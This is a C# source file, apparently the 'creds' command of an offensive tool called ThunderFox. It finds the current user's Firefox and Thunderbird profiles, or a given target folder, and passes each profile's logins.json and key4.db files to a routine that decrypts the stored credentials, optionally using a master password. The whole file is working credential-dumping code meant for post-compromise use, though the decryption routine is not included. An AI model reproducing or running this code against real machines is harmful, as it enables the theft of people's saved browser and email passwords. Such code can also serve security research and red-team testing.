using System;
using System.Collections.Generic;
using System.IO;

namespace ThunderFox.Commands
{
    public class Creds : ICommand
    {
        public static string CommandName => "creds";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\n[*] Command: Mozilla Credentials");
            arguments.Remove("creds");

            string masterPassword = ""; // master password to decrypt credentials

            if (arguments.ContainsKey("/pass"))
            {
                masterPassword = arguments["/pass"];
            }

            if (arguments.ContainsKey("/target"))
            {
                string target = arguments["/target"].Trim('"').Trim('\'');
                string loginsJsonPath = target + @"\logins.json";
                string keyDBPath = target + @"\key4.db";

                if (File.Exists(loginsJsonPath) && File.Exists(keyDBPath))
                {
                    Console.WriteLine("\n[i] Reading credentials from '{0}'", loginsJsonPath);
                    Console.WriteLine("[i] Using this database file '{0}'", keyDBPath);
                    MozillaCreds.ExtractCredentials(loginsJsonPath, keyDBPath, masterPassword);
                }
                else if(!File.Exists(loginsJsonPath))
                {
                    Console.WriteLine("\r\n[X] '{0}' is not a valid credential file.\n", loginsJsonPath);
                }
                else if (!File.Exists(keyDBPath))
                {
                    Console.WriteLine("\r\n[X] '{0}' is not a valid key database.\n", keyDBPath);
                }
            }
            else if (!arguments.ContainsKey("/target"))
            {
                
                string userName = Environment.GetEnvironmentVariable("USERNAME");

                // Decrypt Firefox Credentials
                Console.WriteLine("\n[*] Checking for Firefox installation as current user ({0})", userName);
                
                // Enumerate Firefox installation directories
                // Adapted from SharpWeb (https://github.com/djhohnstein/SharpWeb)
                string userFirefoxBasePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                    + @"\Mozilla\Firefox\Profiles";

                if (System.IO.Directory.Exists(userFirefoxBasePath))
                {
                    string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                    foreach (string directory in directories)
                    {
                        string loginsJsonPath = String.Format("{0}\\{1}", directory, "logins.json");
                        string keyDBPath = String.Format("{0}\\{1}", directory, "key4.db");
                        if (File.Exists(loginsJsonPath) && File.Exists(keyDBPath))
                        {
                            Console.WriteLine("\n[i] Reading credentials from '{0}'", loginsJsonPath);
                            Console.WriteLine("[i] Using this database file '{0}'", keyDBPath);
                            MozillaCreds.ExtractCredentials(loginsJsonPath, keyDBPath, masterPassword);
                        }
                    }
                }
                else if (!System.IO.Directory.Exists(userFirefoxBasePath))
                {
                    Console.WriteLine("\r\n[X] Firefox installation not found.\n");
                }

                // Decrypt Thunderbird Credentials
                Console.WriteLine("\n[*] Checking for Thunderbird installation as current user ({0})", userName);

                // Enumerate Thunderbird installation directories
                // Adapted from SharpWeb (https://github.com/djhohnstein/SharpWeb)
                string userThunderbirdBasePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
                    + @"\Thunderbird\Profiles";

                if (System.IO.Directory.Exists(userThunderbirdBasePath))
                {
                    string[] directories = Directory.GetDirectories(userThunderbirdBasePath);
                    foreach (string directory in directories)
                    {
                        string loginsJsonPath = String.Format("{0}\\{1}", directory, "logins.json");
                        string keyDBPath = String.Format("{0}\\{1}", directory, "key4.db");
                        if (File.Exists(loginsJsonPath) && File.Exists(keyDBPath))
                        {
                            Console.WriteLine("\n[i] Reading credentials from '{0}'", loginsJsonPath);
                            Console.WriteLine("[i] Using this database file '{0}'", keyDBPath);
                            MozillaCreds.ExtractCredentials(loginsJsonPath, keyDBPath, masterPassword);
                        }
                    }
                }
                else if (!System.IO.Directory.Exists(userThunderbirdBasePath))
                {
                    Console.WriteLine("\r\n[X] Thunderbird installation not found.\n");
                }
            }
        }
    }
}